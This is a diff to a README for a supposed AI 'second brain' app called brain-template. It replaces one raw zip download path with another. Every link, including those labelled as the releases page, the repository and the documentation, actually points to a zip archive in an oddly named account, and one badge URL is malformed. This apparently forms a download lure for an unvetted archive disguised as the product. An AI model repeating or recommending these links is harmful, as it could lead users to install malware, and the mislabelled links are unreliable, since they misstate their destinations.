@@ -1,6 +1,6 @@
 # 🧠 brain-template - Your AI-Enhanced Second Brain Awaits
 
-[![Download brain-template](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip%https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip)](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip)
+[![Download brain-template](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip%https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip)](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ Getting started with brain-template is a straightforward process. Follow these s
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page, where you can download the latest version of brain-template:  
-   [Download brain-template](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip)
+   [Download brain-template](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip)
 
 2. **Download the Latest Version**  
    On the Releases page, find the latest version listed. Click on the asset that corresponds to your operating system. You will see options for Windows, macOS, and Linux.
@@ -76,8 +76,8 @@ We welcome any feedback regarding brain-template. If you encounter problems or h
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip)
-- [Releases Page](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip)
-- [Documentation](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/horizontally/brain-template.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Unacknowledged-ploceusphilippinus953/brain-template/main/todo/brain_template_1.8.zip)
 
 With brain-template, you can take control of your knowledge and enhance your productivity. Start your journey toward effective knowledge management today.
